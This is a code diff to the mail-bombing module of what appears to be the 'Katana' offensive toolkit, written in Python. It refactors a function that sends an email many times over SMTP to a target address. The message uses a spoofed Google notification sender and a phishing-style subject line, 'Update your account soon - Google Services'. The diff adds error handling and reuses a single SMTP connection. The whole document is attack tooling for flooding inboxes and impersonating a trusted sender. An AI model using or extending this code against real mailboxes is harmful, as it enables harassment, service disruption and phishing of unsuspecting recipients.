@@ -6,8 +6,11 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Katana Core                #
 from core.design import *    #
+from core.Setting import *   #
+from core import Errors      #
 from core import help        #
 from core import ping        #
+import sys                   #
 d=DESIGN()                   #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Libraries                  #
@@ -15,8 +18,8 @@ import smtplib               #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Default                    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
-defaulthost="127.0.0.1"
-defaultport="110"
+defaulthost=LOCAL_IP
+defaultport=SMTP_PORT
 defaultfrom="notification.center@mail.google.com"
 defaultdest="target@services.com"
 defaultsubj="Update your account soon - Google Services"
@@ -91,22 +94,23 @@ def smtpbombing(run):
 			i=int(defaultmany)
 			try:
 				with open(defaulttemp,'r') as body:
-					while 0 < i:
-						i-=1
-						try:
-							smtp = smtplib.SMTP(defaulthost, defaultport)
-						 	smtp.sendmail(defaultfrom, defaultdest, body) 
-						 	if True:
-						 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
-						except:
-						 	print " "+Bad+" ("+str(i)+")E-mail not was sent."
-					print ""
+					try:
+						smtp = smtplib.SMTP(defaulthost, defaultport)
+						while 0 < i:
+							i-=1
+
+							try:
+							 	smtp.sendmail(defaultfrom, defaultdest, body) 
+							 	if True:
+							 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
+							except:
+							 	print " "+Bad+" ("+str(i)+")E-mail not was sent."
+					except:
+						Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
 			except:
-				d.arcnot(defaulttemp)
-				smtpbombing(0)
+				Errors.Errors(event=sys.exc_info()[0], info=defaulttemp)
 		else:
-			d.nocommand()
+			d.No_actions()
 	except:
-		d.kbi()
-		exit()
+		Errors.Errors(event=sys.exc_info()[0], info=False)
 	smtpbombing(0)
